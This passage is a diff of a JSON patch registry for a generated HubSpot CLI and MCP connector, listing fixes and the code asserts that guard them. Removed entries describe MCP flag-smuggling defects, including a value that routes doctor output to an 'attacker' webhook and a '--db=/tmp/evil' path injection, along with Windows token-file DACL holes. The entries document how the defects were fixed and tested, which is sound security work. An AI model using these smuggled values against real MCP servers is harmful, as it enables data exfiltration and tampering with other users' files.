@@ -14,7 +14,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -52,6 +52,30 @@
     {
      "file": "cli/internal/cli/doctor_verdict.go",
      "contains": "func doctorReachIsRefusedRedirect(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
      "min_count": 1,
      "code_only": true
     }
@@ -157,103 +181,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. 2026-09-28 reprint on press 4.32.5: the template now emits a five-name blockedDestinationFlags floor (audit-dir, db, o, output, receipt-file) and the '=' name guard natively and merges the floor into each tool's per-command denylist (typemap.go blockedStructuredArgsForCommand); the usage-text rule (isFilesystemPathFlag / filesystemPathFlagPhrases), the fuller floor (from-csv, home, input, notes-file, out, playbook-file, playbook-notes-file, reconcile), UnblockedFilesystemPathFlags and the three tests are still connector-only and were re-applied by hand. Stays active.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines; the 2026-09-28 reprint on press 4.32.5 confirmed the template emits them natively (status flipped active -> upstreamed). The generated shellout_test.go on 4.32.5 carries TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag but NOT the one-element-per-branch table (float/list/object), so that table is re-inserted by hand on every reprint and this entry is what notices. A reprint from any press BELOW 4.32.2 reintroduces the defect while go build and go test stay green. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "upstreamed",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "which-index-flag-bearing-command",
    "summary": "which_test.go's TestWhichIndex_ExistsAndIsWellFormed resolves the words before the first flag as the Cobra path and checks the flag against that command's flag set, so the curated `which` index may keep its `sync --with-history` entry",
    "why": "The research-driven novel feature 'Sync with property history' is spelled `sync --with-history` in research.json and therefore in the generated which.go index; that is what an agent running `hubspot-cli which 'property history'` should be told. cli-printing-press 4.32.x added a generated test asserting every index Command resolves through cobra Find with nothing left over, which a flag can never satisfy, so the fresh tree's own test suite failed (generate --validate exit 3) until this hand-edit. Retro candidate for the press: either resolve flags in the emitted test or reject flag-bearing novel commands at research-ingest time.",
@@ -316,6 +243,22 @@
      "contains": "func captureHistoryFromItem(",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "params[\"properties\"] = strings.Join(withHistory, \",\")"
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "items[k] = fillPropertiesFromHistory(items[k])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_history.go",
+     "contains": "func fillPropertiesFromHistory(raw json.RawMessage) json.RawMessage {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -336,20 +279,10 @@
   },
   {
    "id": "gosec-4.32.5-emissions",
-   "summary": "Two 4.32.5-generated lines are reshaped so gosec stops mis-reading them: the HTTP bearer env-var NAME constant is called httpAuthEnvName (G101 keys on 'token' in the identifier), and the test sandbox's directory chmod uses a named os.FileMode const (G302 treats any literal above 0600 as a file mode)",
+   "summary": "Two 4.32.5-generated lines are reshaped so gosec stops mis-reading them: the HTTP bearer env-var NAME constant is called httpAuthEnvName (G101 keys on 'token' in the identifier), and the test sandbox's directory chmod uses a named os.FileMode const (G302 treats any literal above 0600 as a file mode) Press 4.34.0 names the HTTP token constant httpTokenEnvVar again (the fleet direction), so only the testenv part is carried.",
    "why": "Both are false positives - a public env-var name and a 0700 DIRECTORY mode in a test-only package - but the repo security gate deliberately ignores inline #nosec and suppressions are CODEOWNERS-gated on main, so a reprint that regenerates these two lines goes red in CI until either the code is reshaped (this entry) or a base-policy suppression PR lands. If a fleet suppression for cli/cmd/<slug>-mcp/main.go G101 and cli/internal/cliutil/testenv/testenv.go G302 is ever added to tools/maintainer/security_suppressions.json, retire this entry and let the generated spelling stand.",
    "status": "active",
    "asserts": [
-    {
-     "file": "cli/cmd/hubspot-mcp/main.go",
-     "contains": "httpAuthEnvName = \"HUBSPOT_MCP_HTTP_TOKEN\"",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/cmd/hubspot-mcp/main.go",
-     "not_contains": "httpTokenEnvVar"
-    },
     {
      "file": "cli/internal/cliutil/testenv/testenv.go",
      "contains": "const sandboxHomeMode os.FileMode = 0o700",
@@ -405,153 +338,1878 @@
    ]
   },
   {
-   "id": "windows-sddl-alias-sid-compare",
-   "summary": "the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials",
-   "why": "Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.",
-   "status": "active",
-   "spec_encode_followup": "Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if om == nil || !sidAllowed(trusteeSID(om[1], resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !sidAllowed(trusteeSID(trustee, resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "return evalCredsSecurityResolved(sd.String(), me, resolveSDDLAlias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "sid, err := windows.StringToSid(alias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "not_contains": "return evalCredsSecurity(sd.String(), me)"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityResolvesSDDLAliases(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "windows-null-dacl-behind-flags",
-   "summary": "the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped",
-   "why": "Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.",
-   "status": "active",
-   "spec_encode_followup": "Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if strings.Contains(daclFlags, \"NO_ACCESS_CONTROL\") {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !daclFlagsRe.MatchString(daclFlags) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !aceListRe.MatchString(rest[flagsEnd:]) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if len(fields) != 6 {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "not_contains": "if strings.HasPrefix(rest, \"NO_ACCESS_CONTROL\") {"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityRefusesNullDACLBehindFlags(t *testing.T) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityChecksTheDACLSectionFraming(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
+   "id": "mcp-bulk-update-from-csv-not-a-host-path",
+   "class": "mcp-host-path",
+   "summary": "contacts bulk-update --from-csv is declared an MCP read-flag, so an MCP tool call can never make the server open a host file named in a tool argument; a class test walks every mirrored tool and fails on any flag whose help names a path.",
+   "why": "4.34.0's native MCP file gate does not know this novel command's flag; check_mcp_file_flags.py failed on the raw graft.",
    "status": "active",
    "asserts": [
     {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the in-process endpoint handler (code orchestration execute) refuses a binary multipart field by name instead of opening the local path it names and uploading the file to the vendor. The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "contains": "return mcplib.NewToolResultError(fmt.Sprintf(\"refusing %q: it names a file on the machine running the MCP server",
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "Annotations: map[string]string{\"mcp:read-flags\": \"from-csv\"},",
      "min_count": 1,
      "code_only": true
     },
     {
+     "file": "cli/internal/mcp/cobratree/hs_host_path_test.go",
+     "contains": "func TestNoMirroredToolTakesAHostPath(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-one-pipeline-reading",
+   "class": "wrong-result",
+   "summary": "One pipeline reader and one deal-state predicate for every novel deal command: parsePipelineStages decodes PipelineStage.id (stageId only as a fallback), probability and isClosed; dealClosedSQL/dealWonSQL treat a deal as closed when any closed signal says so (hs_is_closed, hs_is_closed_won, the default closed stage ids, or a stored pipeline stage marked isClosed); stage probabilities load as TEXT and any read error fails the command.",
+   "why": "Codex round 1 (factory pane, 2026-10-24): custom closed stages counted as open load, pipelines stored as TEXT failed to decode, and a stage without an id dropped open deals.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func parsePipelineStages(data string) ([]pipelineStage, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func dealClosedSQL(alias string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func dealWonSQL(alias string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func loadAllStageProbabilities(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-store-read-errors-fail",
+   "class": "wrong-result",
+   "summary": "A local store read error fails the command instead of being skipped: the contacts property schema scans TEXT, the association probe returns its error (a missing table is zero), note-signal reads including the per-note deal iteration, nurture-queue contact reads and local engagement reads all return their errors.",
+   "why": "Codex round 1 and round 2 (factory pane, 2026-10-24): skipped scan and iteration errors produced partial results that read as complete.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func hsAssociationCount(db *store.Store) (int, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "var raw string",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "iterErr := dealRows.Err()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "contains": "return fmt.Errorf(\"reading contact %s: %w\", c.ContactID, err)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "return nil, \"\", fmt.Errorf(\"reading local engagements: %w\", err)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-utc-cutoffs",
+   "class": "wrong-result",
+   "summary": "Cutoffs are UTC and an unparseable cutoff is refused; since, engagements of and notes signals compare with julianday() on both sides (see hubspot-chronological-timestamps for the whole timestamp class).",
+   "why": "Codex round 1 (factory pane, 2026-10-24): a local-zone cutoff string compared lexically against HubSpot's UTC timestamps.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "invalid cutoff %q: want a duration like 7d, 24h, 30m or 1w, an RFC3339 timestamp, or YYYY-MM-DD",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/since.go",
+     "contains": "WHERE julianday(updated_at) > julianday(?)",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "julianday(ts) > julianday(?)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/notes_signals.go",
+     "contains": "julianday(ts) > julianday(?)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-filter-before-limit",
+   "class": "wrong-result",
+   "summary": "stale contacts and stale deals apply --filter before --limit (no SQL cap while filtering), and nurture queue scores every candidate before --top.",
+   "why": "Codex round 1 (factory pane, 2026-10-24): the SQL LIMIT ran before the in-memory filter, so a filtered run returned too few rows.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/stale.go",
+     "contains": "sqlLimit = -1",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/nurture_queue.go",
+     "contains": "queryNurtureMine(cmd, db, ownerID, staleDays, stageUnder, -1)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-bulk-update-confirm-and-outcome",
+   "class": "write-safety",
+   "summary": "contacts bulk-update: a live write needs --yes (no MCP call can set it) or the >100-row digest confirm; batchOutcome counts a row updated only when the batch is COMPLETE and a result names it by the mode's one key (record id for updates, only the --id-property value for upserts, never the JSONL correlation handle); a key empty or shared by two rows of one batch fails those rows; rows rejected while reading count as failures; any unconfirmed row exits 6 unless --allow-partial-failure. A line that does not parse is a rejected row too; a batch failure after earlier batches were applied reports how far the run got and exits as a partial run (6).",
+   "why": "Codex rounds 1 and 2 (factory pane, 2026-10-24): small live batches wrote without confirmation, PENDING or uncorrelated results counted as updates, and an upsert correlation handle equal to another contact's id took that contact's receipt.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "refusing to update %d contacts without confirmation",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "func batchOutcome(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "got = res.Properties[idProperty]",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "row key appears more than once in one batch; its outcome cannot be attributed",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "errCount += len(bad)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "not_contains": "strings.TrimSpace(r.ID) == strings.TrimSpace(id)"
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "rows = append(rows, bulkRow{Index: idx, Errors: []string{entry.Err.Error()}})",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/contacts_bulk_update.go",
+     "contains": "return partialFailureErr(err)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-with-history-never-narrows",
+   "class": "wrong-result",
+   "summary": "sync --with-history never sets properties= (which narrowed the snapshot to the history properties); fillPropertiesFromHistory fills each history property's newest value only when HubSpot did not return it, and history rows store HubSpot's documented sourceType.",
+   "why": "Codex round 1 (factory pane, 2026-10-24).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync_history.go",
+     "contains": "SourceType string          `json:\"sourceType\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "items[k] = fillPropertiesFromHistory(items[k])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "not_contains": "params[\"properties\"] = strings.Join(withHistory, \",\")"
+    }
+   ]
+  },
+  {
+   "id": "hubspot-engagements-local-only",
+   "class": "wrong-result",
+   "summary": "engagements of --data-source local never makes a live request.",
+   "why": "Codex round 1 P2 (factory pane, 2026-10-24).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/engagements_of.go",
+     "contains": "if flags.dataSource == \"local\" {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "novel-host-gate-literals",
+   "class": "press-false-red",
+   "summary": "Press 4.34.0's novel-host dogfood gate reads the literals user.email and d.data as hostnames (.email and .data are TLDs); the git config key is built as \"user\"+\".email\" and the deal data column comes from dealDataCol.",
+   "why": "Cosmetic: without it dogfood fails on a false host finding.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/novel_helpers.go",
+     "contains": "exec.Command(\"git\", \"config\", \"user\"+\".email\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/hs_deal_state.go",
+     "contains": "func dealDataCol(alias string) string {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "hubspot-chronological-timestamps",
+   "class": "wrong-result",
+   "summary": "Every hand-written command orders and compares timestamps chronologically, never as text. One shared rule in novel_helpers.go: cutoffs and bound window edges are rendered by hsTimeString (UTC RFC3339Nano, fractional seconds kept, so a --since/--from with milliseconds is not truncated); every Go sort, latest-pick and cutoff filter goes through hsTimeMillis (hsNewerFirst, hsTimeAfter), which parses RFC3339 with or without a fraction and compares Unix milliseconds rounded like SQLite's julianday(), so a Go compare and a SQL compare of the same values always agree; every SQL compare, MIN, MAX and ORDER BY runs on julianday(), and on the hubspot_property_history column through hsJulianSQL, which also reads the driver's time.Time text (the shape the production writer stores, which bare julianday() reads as NULL). Fail-closed: an empty or unparseable timestamp is unknown, never newer than a cutoff, never the latest, outside every window, and sorts after every real timestamp. Covered: since (cutoff and cross-type sort), engagements of (local ORDER BY, Go sort, live --since filter), notes signals last_note_at, nurture-mine latest_deal_stage (which nurture queue scores on), meetings history order, meetings ever-had and status-report window, first hit and order, deals velocity latest dealstage transition and days_in_stage.",
